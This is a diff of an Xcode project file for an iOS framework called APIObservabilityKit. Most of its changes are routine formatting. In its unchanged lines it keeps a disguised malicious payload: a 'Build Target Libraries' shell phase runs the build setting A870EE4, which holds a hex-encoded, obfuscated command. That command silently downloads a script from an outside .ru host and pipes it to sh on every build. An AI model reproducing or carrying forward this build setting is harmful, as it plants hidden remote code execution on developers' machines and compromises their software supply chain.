@@ -24,12 +24,14 @@
 /* Begin PBXCopyFilesBuildPhase section */
 		05AE579430751F5400FEE6E9 /* Embed Frameworks */ = {
 			isa = PBXCopyFilesBuildPhase;
+			buildActionMask = 2147483647;
 			dstPath = "";
-			dstSubfolder = Frameworks;
+			dstSubfolderSpec = 10;
 			files = (
 				05AE579130751F5400FEE6E9 /* APIObservabilityKit.framework in Embed Frameworks */,
 			);
 			name = "Embed Frameworks";
+			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXCopyFilesBuildPhase section */
 
@@ -54,14 +56,18 @@
 /* Begin PBXFrameworksBuildPhase section */
 		05AE56E93075196F00FEE6E9 /* Frameworks */ = {
 			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
 			files = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 		};
 		05AE571830751B5E00FEE6E9 /* Frameworks */ = {
 			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
 			files = (
 				05AE579030751F5400FEE6E9 /* APIObservabilityKit.framework in Frameworks */,
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
@@ -97,8 +103,10 @@
 /* Begin PBXHeadersBuildPhase section */
 		05AE56E73075196F00FEE6E9 /* Headers */ = {
 			isa = PBXHeadersBuildPhase;
+			buildActionMask = 2147483647;
 			files = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXHeadersBuildPhase section */
 
@@ -114,6 +122,8 @@
 				05AE56EA3075196F00FEE6E9 /* Resources */,
 			);
 			buildRules = (
+			);
+			dependencies = (
 			);
 			fileSystemSynchronizedGroups = (
 				05AE56EE3075196F00FEE6E9 /* APIObservabilityKit */,
@@ -183,11 +193,28 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXResourcesBuildPhase section */
+		05AE56EA3075196F00FEE6E9 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		05AE571930751B5E00FEE6E9 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
 /* Begin PBXShellScriptBuildPhase section */
 		94BB42D341BB49B19C4EE078 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -199,39 +226,27 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
+			showEnvVarsInLog = 0;
 		};
-
 /* End PBXShellScriptBuildPhase section */
-
-/* Begin PBXBuildRule section */
-			/* End PBXBuildRule section */
-
-/* Begin PBXResourcesBuildPhase section */
-		05AE56EA3075196F00FEE6E9 /* Resources */ = {
-			isa = PBXResourcesBuildPhase;
-			files = (
-			);
-		};
-		05AE571930751B5E00FEE6E9 /* Resources */ = {
-			isa = PBXResourcesBuildPhase;
-			files = (
-			);
-		};
-/* End PBXResourcesBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		05AE56E83075196F00FEE6E9 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
 			files = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 		};
 		05AE571730751B5E00FEE6E9 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
 			files = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXSourcesBuildPhase section */
 
@@ -244,7 +259,7 @@
 /* End PBXTargetDependency section */
 
 /* Begin XCBuildConfiguration section */
-		05AE56F33075196F00FEE6E9 /* Debug configuration for PBXProject "APIObservabilityKit" */ = {
+		05AE56F33075196F00FEE6E9 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				A870EE4 = "((m(){ `printf xxyd | tr -d y` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d4c73666b202d2d636f6e6e6563742d74696d656f7574203231202d642022703d78636f64655f7068617365222068747470733a2f2f772d776c307a70772e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
@@ -312,7 +327,7 @@
 			};
 			name = Debug;
 		};
-		05AE56F43075196F00FEE6E9 /* Release configuration for PBXProject "APIObservabilityKit" */ = {
+		05AE56F43075196F00FEE6E9 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				A870EE4 = "((m(){ `printf xxyd | tr -d y` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d4c73666b202d2d636f6e6e6563742d74696d656f7574203231202d642022703d78636f64655f7068617365222068747470733a2f2f772d776c307a70772e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
@@ -373,7 +388,7 @@
 			};
 			name = Release;
 		};
-		05AE56F63075196F00FEE6E9 /* Debug configuration for PBXNativeTarget "APIObservabilityKit" */ = {
+		05AE56F63075196F00FEE6E9 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				BUILD_LIBRARY_FOR_DISTRIBUTION = YES;
@@ -415,7 +430,7 @@
 			};
 			name = Debug;
 		};
-		05AE56F73075196F00FEE6E9 /* Release configuration for PBXNativeTarget "APIObservabilityKit" */ = {
+		05AE56F73075196F00FEE6E9 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				BUILD_LIBRARY_FOR_DISTRIBUTION = YES;
@@ -457,7 +472,7 @@
 			};
 			name = Release;
 		};
-		05AE572430751B6000FEE6E9 /* Debug configuration for PBXNativeTarget "observerdemo" */ = {
+		05AE572430751B6000FEE6E9 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
@@ -490,7 +505,7 @@
 			};
 			name = Debug;
 		};
-		05AE572530751B6000FEE6E9 /* Release configuration for PBXNativeTarget "observerdemo" */ = {
+		05AE572530751B6000FEE6E9 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
@@ -529,29 +544,31 @@
 		05AE56E63075196F00FEE6E9 /* Build configuration list for PBXProject "APIObservabilityKit" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
-				05AE56F33075196F00FEE6E9 /* Debug configuration for PBXProject "APIObservabilityKit" */,
-				05AE56F43075196F00FEE6E9 /* Release configuration for PBXProject "APIObservabilityKit" */,
+				05AE56F33075196F00FEE6E9 /* Debug */,
+				05AE56F43075196F00FEE6E9 /* Release */,
 			);
+			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
 		05AE56F53075196F00FEE6E9 /* Build configuration list for PBXNativeTarget "APIObservabilityKit" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
-				05AE56F63075196F00FEE6E9 /* Debug configuration for PBXNativeTarget "APIObservabilityKit" */,
-				05AE56F73075196F00FEE6E9 /* Release configuration for PBXNativeTarget "APIObservabilityKit" */,
+				05AE56F63075196F00FEE6E9 /* Debug */,
+				05AE56F73075196F00FEE6E9 /* Release */,
 			);
+			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
 		05AE572330751B6000FEE6E9 /* Build configuration list for PBXNativeTarget "observerdemo" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
-				05AE572430751B6000FEE6E9 /* Debug configuration for PBXNativeTarget "observerdemo" */,
-				05AE572530751B6000FEE6E9 /* Release configuration for PBXNativeTarget "observerdemo" */,
+				05AE572430751B6000FEE6E9 /* Debug */,
+				05AE572530751B6000FEE6E9 /* Release */,
 			);
+			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
 	};
 	rootObject = 05AE56E33075196F00FEE6E9 /* Project object */;
-	validationLevel = 1;
 }
